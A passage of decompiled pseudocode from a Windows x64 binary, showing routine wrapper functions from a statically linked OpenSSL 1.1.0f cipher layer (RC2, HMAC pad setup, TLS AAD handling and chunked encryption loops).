    if ( *(_QWORD *)(v11 + 384) )
    {
      v12 = sub_140024D20(a1);
      (*(void (__fastcall **)(unsigned __int16 *, unsigned __int16 *, __int64, __int64, __int64))(v11 + 384))(
        &v16,
        &v16,
        8i64,
        v11,
        v12);
    }
    else
    {
      v13 = sub_140024CF0(a1);
      v14 = (unsigned __int16 *)sub_140024D20(a1);
      sub_140082CA0(&v16, (__int64)&v16, 8, v11, (unsigned int *)(v11 + 128), (unsigned int *)(v11 + 256), v14, v13);
    }
    sub_140087CB0((unsigned int *)a2, a4 - 16, v18);
    if ( !(unsigned int)sub_140023460(v18, (__int64)&v16, 8i64) )
      v4 = a4 - 16;
    sub_140023440((__int64)&v16, 8i64);
    sub_140023440((__int64)v18, 20i64);
    sub_140023440((__int64)v17, 8i64);
    v15 = sub_140024D20(a1);
    sub_140023440(v15, 8i64);
    if ( v4 == -1 )
      sub_140023440(a2, a4 - 16);
  }
  return v4;
}
// 140055480: using guessed type unsigned __int8 var_60[8];

//----- (00000001400556D0) ----------------------------------------------------
__int64 __fastcall sub_1400556D0(__int64 a1, unsigned __int8 *a2, void *a3, size_t a4)
{
  __int64 v9; // rax
  unsigned __int64 v10; // rbx
  __int64 v11[3]; // [rsp+20h] [rbp-48h] BYREF

  if ( !a2 )
    return a4 + 16;
  memmove(a2 + 8, a3, a4);
  sub_140087CB0((unsigned int *)a3, a4, v11);
  *(_QWORD *)&a2[a4 + 8] = v11[0];
  sub_140023440((__int64)v11, 20i64);
  v9 = sub_140024D20(a1);
  if ( (int)sub_140025460(v9, 8u) <= 0 )
    return 0xFFFFFFFFi64;
  *(_QWORD *)a2 = *(_QWORD *)sub_140024D20(a1);
  sub_140054D90(a1, (__int64)(a2 + 8), (unsigned __int16 *)a2 + 4, a4 + 8);
  v10 = a4 + 16;
  sub_140082660(a2, 0i64, v10);
  *(_QWORD *)sub_140024D20(a1) = 0x521E8792CA2DD4Ai64;
  sub_140054D90(a1, (__int64)a2, (unsigned __int16 *)a2, v10);
  return (unsigned int)v10;
}

//----- (00000001400557E0) ----------------------------------------------------
__int64 __fastcall sub_1400557E0(__int64 a1, __int64 a2)
{
  _DWORD *v4; // rax

  v4 = (_DWORD *)sub_140024D00(a1);
  sub_140086770((unsigned __int16 *)a2, v4);
  *(_QWORD *)(sub_140024D00(a1) + 128) = *(_QWORD *)(a2 + 8);
  *(_QWORD *)(sub_140024D00(a1) + 136) = *(_QWORD *)(a2 + 16);
  return 1i64;
}

//----- (0000000140055840) ----------------------------------------------------
__int64 __fastcall sub_140055840(__int64 a1, __int64 a2, unsigned __int16 *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // r15
  __int64 v6; // r12
  unsigned __int64 v8; // r12
  __int64 v9; // r15
  int v10; // ebp
  unsigned __int16 *v11; // rsi
  unsigned __int16 *v12; // rdi
  _BYTE *v13; // rbx
  unsigned int *v14; // rax
  int v15; // ebp
  unsigned __int16 *v16; // rsi
  unsigned __int16 *v17; // rdi
  _BYTE *v18; // rbx
  unsigned int *v19; // rax
  __int64 v21; // [rsp+88h] [rbp+10h]
  unsigned __int64 v22; // [rsp+98h] [rbp+20h]

  v4 = a4;
  v6 = a2;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v22 = -1073741824i64 * (a4 >> 30) + a4;
    v9 = a2;
    do
    {
      v10 = sub_140024CF0(a1);
      v11 = (unsigned __int16 *)(sub_140024D00(a1) + 136);
      v12 = (unsigned __int16 *)(sub_140024D00(a1) + 128);
      v13 = (_BYTE *)sub_140024D20(a1);
      v14 = (unsigned int *)sub_140024D00(a1);
      sub_140087D50(a3, v9, 0x40000000u, v14, v13, v12, v11, v10);
      a3 += 0x20000000;
      v9 += 0x40000000i64;
      --v8;
    }
    while ( v8 );
    v21 = v9;
    v4 = v22;
    v6 = v21;
  }
  if ( v4 )
  {
    v15 = sub_140024CF0(a1);
    v16 = (unsigned __int16 *)(sub_140024D00(a1) + 136);
    v17 = (unsigned __int16 *)(sub_140024D00(a1) + 128);
    v18 = (_BYTE *)sub_140024D20(a1);
    v19 = (unsigned int *)sub_140024D00(a1);
    sub_140087D50(a3, v6, v4, v19, v18, v17, v16, v15);
  }
  return 1i64;
}

//----- (00000001400559B0) ----------------------------------------------------
const char *sub_1400559B0()
{
  return "P";
}

//----- (00000001400559C0) ----------------------------------------------------
__int64 __fastcall sub_1400559C0(__int64 a1, __int64 a2)
{
  int v4; // edi
  _QWORD *v5; // rax

  v4 = sub_140024D30(a1);
  v5 = (_QWORD *)sub_140024D00(a1);
  sub_14005DD50(v5, v4, a2);
  return 1i64;
}

//----- (0000000140055A10) ----------------------------------------------------
__int64 __fastcall sub_140055A10(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4)
{
  _DWORD *v7; // rax

  v7 = (_DWORD *)sub_140024D00(a1);
  sub_14005DEB0(v7, a4, a3, a2);
  return 1i64;
}

//----- (0000000140055A60) ----------------------------------------------------
void *sub_140055A60()
{
  return &unk_1400F8BE0;
}

//----- (0000000140055A70) ----------------------------------------------------
void *sub_140055A70()
{
  return &unk_1400F8C40;
}

//----- (0000000140055A80) ----------------------------------------------------
__int64 __fastcall sub_140055A80(__int64 a1, __int64 a2)
{
  __int64 v4; // rsi
  int v5; // eax
  int v6; // eax
  __int128 v7; // xmm0
  __int128 v8; // xmm1
  __int128 v9; // xmm0
  __int128 v10; // xmm1
  __int128 v11; // xmm0
  __int128 v12; // xmm0
  __int128 v13; // xmm1
  __int128 v14; // xmm0
  __int128 v15; // xmm1
  __int128 v16; // xmm0

  v4 = sub_140024D00(a1);
  v5 = sub_140024D30(a1);
  sub_14005DD50((_QWORD *)v4, v5, a2);
  sub_140088590((_DWORD *)(v4 + 1032));
  v6 = *(_DWORD *)(v4 + 1120);
  v7 = *(_OWORD *)(v4 + 1032);
  *(_QWORD *)(v4 + 1312) = -1i64;
  v8 = *(_OWORD *)(v4 + 1048);
  *(_OWORD *)(v4 + 1124) = v7;
  v9 = *(_OWORD *)(v4 + 1064);
  *(_OWORD *)(v4 + 1140) = v8;
  v10 = *(_OWORD *)(v4 + 1080);
  *(_OWORD *)(v4 + 1156) = v9;
  v11 = *(_OWORD *)(v4 + 1096);
  *(_OWORD *)(v4 + 1172) = v10;
  *(_QWORD *)&v10 = *(_QWORD *)(v4 + 1112);
  *(_OWORD *)(v4 + 1188) = v11;
  v12 = *(_OWORD *)(v4 + 1032);
  *(_QWORD *)(v4 + 1204) = v10;
  v13 = *(_OWORD *)(v4 + 1048);
  *(_DWORD *)(v4 + 1212) = v6;
  *(_OWORD *)(v4 + 1216) = v12;
  v14 = *(_OWORD *)(v4 + 1064);
  *(_OWORD *)(v4 + 1232) = v13;
  v15 = *(_OWORD *)(v4 + 1080);
  *(_OWORD *)(v4 + 1248) = v14;
  v16 = *(_OWORD *)(v4 + 1096);
  *(_OWORD *)(v4 + 1264) = v15;
  *(_QWORD *)&v15 = *(_QWORD *)(v4 + 1112);
  *(_OWORD *)(v4 + 1280) = v16;
  *(_QWORD *)(v4 + 1296) = v15;
  *(_DWORD *)(v4 + 1304) = v6;
  return 1i64;
}

//----- (0000000140055B80) ----------------------------------------------------
__int64 __fastcall sub_140055B80(__int64 a1, unsigned __int8 *a2, unsigned __int8 *a3, unsigned __int64 a4)
{
  __int64 v8; // rdi
  size_t v9; // rsi
  int v10; // eax
  __int128 v11; // xmm1
  __int128 v12; // xmm0
  __int128 v13; // xmm1
  __int128 v14; // xmm0
  int v15; // eax
  __int128 v16; // xmm1
  __int128 v17; // xmm0
  __int128 v18; // xmm1
  __int128 v19; // xmm0
  unsigned __int8 v21[16]; // [rsp+20h] [rbp-58h] BYREF

  v8 = sub_140024D00(a1);
  v9 = *(_QWORD *)(v8 + 1312);
  if ( v9 != -1i64 && a4 != v9 + 16 )
    return 0i64;
  if ( (unsigned int)sub_140024CF0(a1) )
  {
    if ( v9 == -1i64 )
      v9 = a4;
    sub_1400885E0(v8 + 1216, a3, v9);
    if ( v9 == a4 )
    {
      sub_14005DEB0((_DWORD *)v8, a4, a3, a2);
    }
    else
    {
      if ( a3 != a2 )
        memmove(a2, a3, v9);
      sub_140088420((__int64)&a2[v9], v8 + 1216);
      v10 = *(_DWORD *)(v8 + 1212);
      v11 = *(_OWORD *)(v8 + 1140);
      *(_OWORD *)(v8 + 1216) = *(_OWORD *)(v8 + 1124);
      v12 = *(_OWORD *)(v8 + 1156);
      *(_OWORD *)(v8 + 1232) = v11;
      v13 = *(_OWORD *)(v8 + 1172);
      *(_OWORD *)(v8 + 1248) = v12;
      v14 = *(_OWORD *)(v8 + 1188);
      *(_OWORD *)(v8 + 1264) = v13;
      *(_QWORD *)&v13 = *(_QWORD *)(v8 + 1204);
      *(_OWORD *)(v8 + 1280) = v14;
      *(_QWORD *)(v8 + 1296) = v13;
      *(_DWORD *)(v8 + 1304) = v10;
      sub_1400885E0(v8 + 1216, &a2[v9], 0x10ui64);
      sub_140088420((__int64)&a2[v9], v8 + 1216);
      sub_14005DEB0((_DWORD *)v8, a4, a2, a2);
    }
    goto LABEL_15;
  }
  sub_14005DEB0((_DWORD *)v8, a4, a3, a2);
  if ( v9 == -1i64 )
  {
    sub_1400885E0(v8 + 1216, a2, a4);
  }
  else
  {
    sub_1400885E0(v8 + 1216, a2, v9);
    sub_140088420((__int64)v21, v8 + 1216);
    v15 = *(_DWORD *)(v8 + 1212);
    v16 = *(_OWORD *)(v8 + 1140);
    *(_OWORD *)(v8 + 1216) = *(_OWORD *)(v8 + 1124);
    v17 = *(_OWORD *)(v8 + 1156);
    *(_OWORD *)(v8 + 1232) = v16;
    v18 = *(_OWORD *)(v8 + 1172);
    *(_OWORD *)(v8 + 1248) = v17;
    v19 = *(_OWORD *)(v8 + 1188);
    *(_OWORD *)(v8 + 1264) = v18;
    *(_QWORD *)&v18 = *(_QWORD *)(v8 + 1204);
    *(_OWORD *)(v8 + 1280) = v19;
    *(_QWORD *)(v8 + 1296) = v18;
    *(_DWORD *)(v8 + 1304) = v15;
    sub_1400885E0(v8 + 1216, v21, 0x10ui64);
    sub_140088420((__int64)v21, v8 + 1216);
    if ( (unsigned int)sub_140023460((char *)&a2[v9], (__int64)v21, 16i64) )
      return 0i64;
  }
LABEL_15:
  *(_QWORD *)(v8 + 1312) = -1i64;
  return 1i64;
}

//----- (0000000140055DD0) ----------------------------------------------------
__int64 __fastcall sub_140055DD0(__int64 a1, int a2, int a3, unsigned __int8 *a4)
{
  size_t v5; // rsi
  __int64 v8; // rbp
  int v9; // ebx
  __m128i si128; // xmm1
  const __m128i *v11; // rax
  __int64 v12; // rdi
  __int64 v13; // rcx
  __m128i v14; // xmm0
  __m128i v15; // xmm2
  const __m128i *v16; // rax
  __m128i v17; // xmm0
  unsigned int v19; // ebx
  __int128 v20; // xmm0
  __int128 v21; // xmm1
  int v22; // eax
  __int128 v23; // xmm0
  __int128 v24; // xmm1
  __int128 v25; // xmm0
  __int64 v26[8]; // [rsp+20h] [rbp-78h] BYREF

  v5 = a3;
  v8 = sub_140024D00(a1);
  v9 = a2 - 22;
  if ( !v9 )
  {
    if ( (_DWORD)v5 == 13 )
    {
      v19 = a4[12] | (a4[11] << 8);
      if ( !(unsigned int)sub_140024CF0(a1) )
      {
        if ( v19 < 0x10 )
          return 0xFFFFFFFFi64;
        v19 -= 16;
        a4[12] = v19;
        a4[11] = BYTE1(v19);
      }
      v20 = *(_OWORD *)(v8 + 1032);
      v21 = *(_OWORD *)(v8 + 1048);
      *(_QWORD *)(v8 + 1312) = v19;
      v22 = *(_DWORD *)(v8 + 1120);
      *(_OWORD *)(v8 + 1216) = v20;
      v23 = *(_OWORD *)(v8 + 1064);
      *(_OWORD *)(v8 + 1232) = v21;
      v24 = *(_OWORD *)(v8 + 1080);
      *(_OWORD *)(v8 + 1248) = v23;
      v25 = *(_OWORD *)(v8 + 1096);
      *(_OWORD *)(v8 + 1264) = v24;
      *(_QWORD *)&v24 = *(_QWORD *)(v8 + 1112);
      *(_OWORD *)(v8 + 1280) = v25;
      *(_QWORD *)(v8 + 1296) = v24;
      *(_DWORD *)(v8 + 1304) = v22;
      sub_1400885E0(v8 + 1216, a4, 0xDui64);
      return 16i64;
    }
    return 0xFFFFFFFFi64;
  }
  if ( v9 != 1 )
    return 0xFFFFFFFFi64;
  memset(v26, 0, sizeof(v26));
  if ( (int)v5 <= 64 )
  {
    memmove(v26, a4, v5);
  }
  else
  {
    sub_140088590((_DWORD *)(v8 + 1032));
    sub_1400885E0(v8 + 1032, a4, v5);
    sub_140088420((__int64)v26, v8 + 1032);
  }
  si128 = _mm_load_si128((const __m128i *)&xmmword_1400F8CA0);
  v11 = (const __m128i *)v26;
  v12 = 2i64;
  v13 = 2i64;
  do
  {
    v14 = _mm_loadu_si128(v11);
    v11 += 2;
    v11[-2] = _mm_xor_si128(v14, si128);
    v11[-1] = _mm_xor_si128(_mm_loadu_si128(v11 - 1), si128);
    --v13;
  }
  while ( v13 );
  sub_140088590((_DWORD *)(v8 + 1032));
  sub_1400885E0(v8 + 1032, (unsigned __int8 *)v26, 0x40ui64);
  v15 = _mm_load_si128((const __m128i *)&xmmword_1400F8CB0);
  v16 = (const __m128i *)v26;
  do
  {
    v17 = _mm_loadu_si128(v16);
    v16 += 2;
    v16[-2] = _mm_xor_si128(v15, v17);
    v16[-1] = _mm_xor_si128(v15, _mm_loadu_si128(v16 - 1));
    --v12;
  }
  while ( v12 );
  sub_140088590((_DWORD *)(v8 + 1124));
  sub_1400885E0(v8 + 1124, (unsigned __int8 *)v26, 0x40ui64);
  sub_140023440((__int64)v26, 64i64);
  return 1i64;
}
// 1400F8CA0: using guessed type __int128 xmmword_1400F8CA0;
// 1400F8CB0: using guessed type __int128 xmmword_1400F8CB0;

//----- (0000000140056030) ----------------------------------------------------
void *sub_140056030()
{
  return &unk_140135690;
}

//----- (0000000140056040) ----------------------------------------------------
__int64 __fastcall sub_140056040(__int64 a1, unsigned __int8 *a2, __int64 a3, int a4)
{
  __int64 v6; // rax
  __int64 v7; // rax
  int *v8; // rax
  _DWORD *v9; // rax
  _DWORD v11[56]; // [rsp+20h] [rbp-F8h] BYREF

  if ( a4
    || (v6 = sub_140021BD0(a1), (sub_140024CF0(v6) & 0xF0007) == 4)
    || (v7 = sub_140021BD0(a1), (sub_140024CF0(v7) & 0xF0007) == 3) )
  {
    v9 = (_DWORD *)sub_140024D00(a1);
    sub_1400893B0(a2, v9);
  }
  else
  {
    sub_1400893B0(a2, v11);
    v8 = (int *)sub_140024D00(a1);
    sub_140089260((__int64)v11, v8);
    sub_140023440((__int64)v11, 216i64);
  }
  return 1i64;
}
// 140056040: using guessed type _DWORD var_F8[56];

//----- (0000000140056110) ----------------------------------------------------
__int64 __fastcall sub_140056110(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v8; // rbp
  unsigned __int64 v9; // rdi
  __int64 v10; // r14
  __int64 v11; // rsi
  _DWORD *v12; // rax

  v8 = *(int *)(sub_140021BD0(a1) + 4);
  if ( a4 >= v8 )
  {
    v9 = a4 - v8;
    v10 = a2 - a3;
    v11 = -a3;
    do
    {
      v12 = (_DWORD *)sub_140024D00(a1);
      sub_1400891A0(a3, (_BYTE *)(v10 + a3), v12);
      a3 += v8;
    }
    while ( v11 + a3 <= v9 );
  }
  return 1i64;
}

//----- (00000001400561A0) ----------------------------------------------------
__int64 __fastcall sub_1400561A0(__int64 a1, _BYTE *a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbp
  unsigned __int64 v8; // rsi
  int v9; // edi
  unsigned int *v10; // rbx
  _DWORD *v11; // rax
  int v12; // edi
  unsigned int *v13; // rbx
  _DWORD *v14; // rax

  v4 = a4;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v4 = -1073741824i64 * (a4 >> 30) + a4;
    do
    {
      v9 = sub_140024CF0(a1);
      v10 = (unsigned int *)sub_140024D20(a1);
      v11 = (_DWORD *)sub_140024D00(a1);
      sub_140089520(a3, a2, 0x40000000u, v11, v10, v9);
      a3 += 0x40000000i64;
      a2 += 0x40000000;
      --v8;
    }
    while ( v8 );
  }
  if ( v4 )
  {
    v12 = sub_140024CF0(a1);
    v13 = (unsigned int *)sub_140024D20(a1);
    v14 = (_DWORD *)sub_140024D00(a1);
    sub_140089520(a3, a2, v4, v14, v13, v12);
  }
  return 1i64;
}

//----- (00000001400562A0) ----------------------------------------------------
__int64 __fastcall sub_1400562A0(__int64 a1, __int64 a2, _BYTE *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbp
  unsigned __int64 v8; // rsi
  unsigned __int8 *v9; // rbx
  __int64 v10; // rax
  unsigned __int8 *v11; // rbx
  __int64 v12; // rax
  int v14; // [rsp+68h] [rbp+20h] BYREF

  v4 = a4;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v4 = -1073741824i64 * (a4 >> 30) + a4;
    do
    {
      v14 = sub_140024D40(a1);
      v9 = (unsigned __int8 *)sub_140024D20(a1);
      v10 = sub_140024D00(a1);
      sub_14008A4B0(a3, a2, 0x40000000, v10, v9, &v14);
      sub_140024D70(a1, v14);
      a3 += 0x40000000;
      a2 += 0x40000000i64;
      --v8;
    }
    while ( v8 );
  }
  if ( v4 )
  {
    v14 = sub_140024D40(a1);
    v11 = (unsigned __int8 *)sub_140024D20(a1);
    v12 = sub_140024D00(a1);
    sub_14008A4B0(a3, a2, v4, v12, v11, &v14);
    sub_140024D70(a1, v14);
  }
  return 1i64;
}

//----- (00000001400563C0) ----------------------------------------------------
__int64 __fastcall sub_1400563C0(__int64 a1, unsigned __int8 *a2, unsigned __int8 *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbx
  unsigned __int64 v5; // rbp
  int v9; // edi
  unsigned __int8 *v10; // rsi
  _DWORD *v11; // rax
  int v13; // [rsp+88h] [rbp+20h] BYREF

  v4 = 0x40000000i64;
  v5 = a4;
  if ( a4 < 0x40000000 )
    v4 = a4;
  if ( !a4 )
    return 1i64;
  do
  {
    if ( v5 < v4 )
      break;
    v13 = sub_140024D40(a1);
    v9 = sub_140024CF0(a1);
    v10 = (unsigned __int8 *)sub_140024D20(a1);
    v11 = (_DWORD *)sub_140024D00(a1);
    sub_14008A290(a3, a2, v5, v11, v10, &v13, v9);
    sub_140024D70(a1, v13);
    v5 -= v4;
    a3 += v4;
    a2 += v4;
    if ( v5 < v4 )
      v4 = v5;
  }
  while ( v5 );
  return 1i64;
}

//----- (00000001400564B0) ----------------------------------------------------
void *sub_1400564B0()
{
  return &unk_1400F8CC0;
}

//----- (00000001400564C0) ----------------------------------------------------
void *sub_1400564C0()
{
  return &unk_1400F8D20;
}

//----- (00000001400564D0) ----------------------------------------------------
void *sub_1400564D0()
{
  return &unk_1400F8DE0;
}

//----- (00000001400564E0) ----------------------------------------------------
void *sub_1400564E0()
{
  return &unk_1400F8D80;
}

//----- (00000001400564F0) ----------------------------------------------------
__int64 __fastcall sub_1400564F0(__int64 a1, __int64 a2)
{
  int *v4; // rsi
  int v5; // ebx
  __int64 v6; // rax

  v4 = (int *)sub_140024D00(a1);
  v5 = sub_140024D30(a1);
  v6 = sub_140024D00(a1);
  sub_14008A6A0((_BYTE *)(v6 + 4), v5, a2, *v4);
  return 1i64;
}

//----- (0000000140056560) ----------------------------------------------------
_BOOL8 __fastcall sub_140056560(__FrameHandler3::TryBlockMap *a1, __int64 a2)
{
  unsigned int v2; // edi
  int NumTryBlocks; // ebx
  __int64 v6; // rax
  int v8; // [rsp+38h] [rbp+10h]

  v2 = 0;
  if ( !a2 )
    return 0i64;
  sub_14001B470((__int64)a1);
  switch ( v8 )
  {
    case 128:
      v2 = 58;
      break;
    case 64:
      v2 = 120;
      break;
    case 40:
      v2 = 160;
      break;
  }
  NumTryBlocks = __FrameHandler3::TryBlockMap::getNumTryBlocks(a1);
  v6 = sub_140024D50((__int64)a1);
  return sub_140040010(a2, v2, v6, NumTryBlocks);
}

//----- (0000000140056610) ----------------------------------------------------
__int64 __fastcall sub_140056610(__FrameHandler3::TryBlockMap *a1, __int64 a2)
{
  int v2; // edi
  unsigned int NumTryBlocks; // eax
  unsigned int v6; // ebx
  unsigned int v7; // ebx
  int v9; // [rsp+30h] [rbp-38h] BYREF
  char Src[16]; // [rsp+38h] [rbp-30h] BYREF

  v2 = 0;
  v9 = 0;
  if ( a2 )
  {
    NumTryBlocks = __FrameHandler3::TryBlockMap::getNumTryBlocks(a1);
    v6 = NumTryBlocks;
    if ( NumTryBlocks > 0x10 )
      sub_1400234A0("assertion failed: l <= sizeof(iv)", "..\\..\\openssl-1.1.0f\\crypto\\evp\\e_rc2.c", 130i64);
    v2 = sub_14003FE80(a2, &v9, Src, NumTryBlocks);
    if ( v2 != v6 )
      return 0xFFFFFFFFi64;
    switch ( v9 )
    {
      case 58:
        v7 = 128;
        break;
      case 120:
        v7 = 64;
        break;
      case 160:
        v7 = 40;
        break;
      default:
        sub_140024610(6, 109, 108, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\e_rc2.c", 115);
        return 0xFFFFFFFFi64;
    }
    if ( v2 <= 0 || (unsigned int)sub_14001B7A0(a1, 0i64, 0i64, 0i64, Src, -1) )
    {
      sub_14001B470((__int64)a1);
      if ( (int)sub_14001B690(a1, v7 >> 3) <= 0 )
        return 0xFFFFFFFFi64;
      return (unsigned int)v2;
    }
    return 0xFFFFFFFFi64;
  }
  return (unsigned int)v2;
}

//----- (0000000140056750) ----------------------------------------------------
__int64 __fastcall sub_140056750(__int64 a1, int a2, int a3, _DWORD *a4)
{
  int v4; // ebx
  __int64 v5; // rdi
  int v6; // edx
  int v8; // eax

  v4 = a3;
  v5 = a1;
  if ( !a2 )
  {
    v8 = sub_140024D30(a1);
    a1 = v5;
    v4 = 8 * v8;
LABEL_9:
    *(_DWORD *)sub_140024D00(a1) = v4;
    return 1i64;
  }
  v6 = a2 - 2;
  if ( v6 )
  {
    if ( v6 != 1 )
      return 0xFFFFFFFFi64;
    if ( a3 <= 0 )
      return 0i64;
    goto LABEL_9;
  }
  *a4 = *(_DWORD *)sub_140024D00(a1);
  return 1i64;
}

//----- (00000001400567E0) ----------------------------------------------------
__int64 __fastcall sub_1400567E0(__int64 a1, __int64 a2, unsigned __int16 *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbp
  unsigned __int64 v8; // rsi
  int v9; // edi
  int *v10; // rbx
  __int64 v11; // rax
  int v12; // edi
  int *v13; // rbx
  __int64 v14; // rax

  v4 = a4;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v4 = -1073741824i64 * (a4 >> 30) + a4;
    do
    {
      v9 = sub_140024CF0(a1);
      v10 = (int *)sub_140024D20(a1);
      v11 = sub_140024D00(a1);
      sub_14008A8D0(a3, a2, 0x40000000u, v11 + 4, v10, v9);
      a3 += 0x20000000;
      a2 += 0x40000000i64;
      --v8;
    }
    while ( v8 );
  }
  if ( v4 )
  {
    v12 = sub_140024CF0(a1);
    v13 = (int *)sub_140024D20(a1);
    v14 = sub_140024D00(a1);
    sub_14008A8D0(a3, a2, v4, v14 + 4, v13, v12);
  }
  return 1i64;
}

//----- (00000001400568E0) ----------------------------------------------------
__int64 __fastcall sub_1400568E0(__int64 a1, _BYTE *a2, char *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbx
  unsigned __int64 v5; // rbp
  int v9; // edi
  unsigned __int16 *v10; // rsi
  __int64 v11; // rax
  int v13; // [rsp+88h] [rbp+20h] BYREF

  v4 = 0x40000000i64;
  v5 = a4;
  if ( a4 < 0x40000000 )
    v4 = a4;
  if ( !a4 )
    return 1i64;
  do
  {
    if ( v5 < v4 )
      break;
    v13 = sub_140024D40(a1);
    v9 = sub_140024CF0(a1);
    v10 = (unsigned __int16 *)sub_140024D20(a1);
    v11 = sub_140024D00(a1);
    sub_14008B0D0(a3, a2, v5, v11 + 4, v10, &v13, v9);
    sub_140024D70(a1, v13);
    v5 -= v4;
    a3 += v4;
    a2 += v4;
    if ( v5 < v4 )
      v4 = v5;
  }
  while ( v5 );
  return 1i64;
}

//----- (00000001400569D0) ----------------------------------------------------
__int64 __fastcall sub_1400569D0(__int64 a1, __int64 a2, unsigned __int8 *a3, unsigned __int64 a4)
{
  unsigned __int64 v8; // r12
  unsigned __int64 v9; // rsi
  __int64 v10; // r15
  __int64 v11; // r14
  int v12; // ebx
  __int64 v13; // rax

  v8 = *(int *)(sub_140021BD0(a1) + 4);
  if ( a4 >= v8 )
  {
    v9 = a4 - v8;
    v10 = a2 - (_QWORD)a3;
    v11 = -(__int64)a3;
    do
    {
      v12 = sub_140024CF0(a1);
      v13 = sub_140024D00(a1);
      sub_14008A800(a3, (__int64)&a3[v10], v13 + 4, v12);
      a3 += v8;
    }
    while ( (unsigned __int64)&a3[v11] <= v9 );
  }
  return 1i64;
}

//----- (0000000140056A80) ----------------------------------------------------
__int64 __fastcall sub_140056A80(__int64 a1, __int64 a2, _BYTE *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rsi
  unsigned __int64 v8; // rdi
  unsigned __int8 *v9; // rbx
  __int64 v10; // rax
  unsigned __int8 *v11; // rbx
  __int64 v12; // rax
  int v14; // [rsp+68h] [rbp+20h] BYREF

  v4 = a4;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v4 = -1073741824i64 * (a4 >> 30) + a4;
    do
    {
      v14 = sub_140024D40(a1);
      v9 = (unsigned __int8 *)sub_140024D20(a1);
      v10 = sub_140024D00(a1);
      sub_14008B2F0(a3, a2, 0x40000000, v10 + 4, v9, &v14);
      sub_140024D70(a1, v14);
      a3 += 0x40000000;
      a2 += 0x40000000i64;
      --v8;
    }
    while ( v8 );
  }
  if ( v4 )
  {
    v14 = sub_140024D40(a1);
    v11 = (unsigned __int8 *)sub_140024D20(a1);
    v12 = sub_140024D00(a1);
    sub_14008B2F0(a3, a2, v4, v12 + 4, v11, &v14);
    sub_140024D70(a1, v14);
  }
  return 1i64;
}

//----- (0000000140056BA0) ----------------------------------------------------
void *sub_140056BA0()
{
  return &unk_1400F9020;
}

//----- (0000000140056BB0) ----------------------------------------------------
void *sub_140056BB0()
{
  return &unk_1400F8FC0;
}

//----- (0000000140056BC0) ----------------------------------------------------
void *sub_140056BC0()
{
  return &unk_1400F8E40;
}

//----- (0000000140056BD0) ----------------------------------------------------
void *sub_140056BD0()
{
  return &unk_1400F8EA0;
}

//----- (0000000140056BE0) ----------------------------------------------------
void *sub_140056BE0()
{
  return &unk_1400F8F60;
}

//----- (0000000140056BF0) ----------------------------------------------------
void *sub_140056BF0()
{
  return &unk_1400F8F00;
}

//----- (0000000140056C00) ----------------------------------------------------
__int64 __fastcall sub_140056C00(__int64 a1, unsigned __int8 *a2)
{
  int v4; // edi
  _DWORD *v5; // rax

  v4 = sub_140024D30(a1);
  v5 = (_DWORD *)sub_140024D00(a1);
  sub_14008B4D0(v5, v4, a2);
  return 1i64;
}

//----- (0000000140056C50) ----------------------------------------------------
__int64 __fastcall sub_140056C50(__int64 a1, _BYTE *a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbp
  unsigned __int64 v8; // rsi
  int v9; // edi
  unsigned int *v10; // rbx
  _DWORD *v11; // rax
  int v12; // edi
  unsigned int *v13; // rbx
  _DWORD *v14; // rax

  v4 = a4;
  if ( a4 >= 0x40000000 )
  {
    v8 = a4 >> 30;
    v4 = -1073741824i64 * (a4 >> 30) + a4;
    do
    {
      v9 = sub_140024CF0(a1);
      v10 = (unsigned int *)sub_140024D20(a1);
      v11 = (_DWORD *)sub_140024D00(a1);
      sub_14008B740(a3, a2, 0x40000000u, v11, v10, v9);
      a3 += 0x40000000i64;
      a2 += 0x40000000;
      --v8;
    }
    while ( v8 );
  }
  if ( v4 )
  {
    v12 = sub_140024CF0(a1);
    v13 = (unsigned int *)sub_140024D20(a1);
    v14 = (_DWORD *)sub_140024D00(a1);
    sub_14008B740(a3, a2, v4, v14, v13, v12);
  }
  return 1i64;
}

//----- (0000000140056D50) ----------------------------------------------------
__int64 __fastcall sub_140056D50(__int64 a1, unsigned __int8 *a2, unsigned __int8 *a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbx
  unsigned __int64 v5; // rbp
  int v9; // edi
  unsigned __int8 *v10; // rsi
  _DWORD *v11; // rax
  int v13; // [rsp+88h] [rbp+20h] BYREF

  v4 = 0x40000000i64;
  v5 = a4;
  if ( a4 < 0x40000000 )
    v4 = a4;
  if ( !a4 )
    return 1i64;
  do
  {
    if ( v5 < v4 )
      break;
    v13 = sub_140024D40(a1);
    v9 = sub_140024CF0(a1);
    v10 = (unsigned __int8 *)sub_140024D20(a1);
    v11 = (_DWORD *)sub_140024D00(a1);
    sub_14008C5F0(a3, a2, v5, v11, v10, &v13, v9);
    sub_140024D70(a1, v13);
    v5 -= v4;
    a3 += v4;
    a2 += v4;
    if ( v5 < v4 )
      v4 = v5;
  }
  while ( v5 );
  return 1i64;
}

//----- (0000000140056E40) ----------------------------------------------------
__int64 __fastcall sub_140056E40(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v8; // r12
  unsigned __int64 v9; // rsi
  __int64 v10; // r15
  __int64 v11; // r14
  int v12; // ebx
  _DWORD *v13; // rax

  v8 = *(int *)(sub_140021BD0(a1) + 4);
  if ( a4 >= v8 )
  {
    v9 = a4 - v8;
    v10 = a2 - a3;
    v11 = -a3;
    do
    {
      v12 = sub_140024CF0(a1);
      v13 = (_DWORD *)sub_140024D00(a1);
      sub_14008B670(a3, (_BYTE *)(v10 + a3), v13, v12);
      a3 += v8;
    }
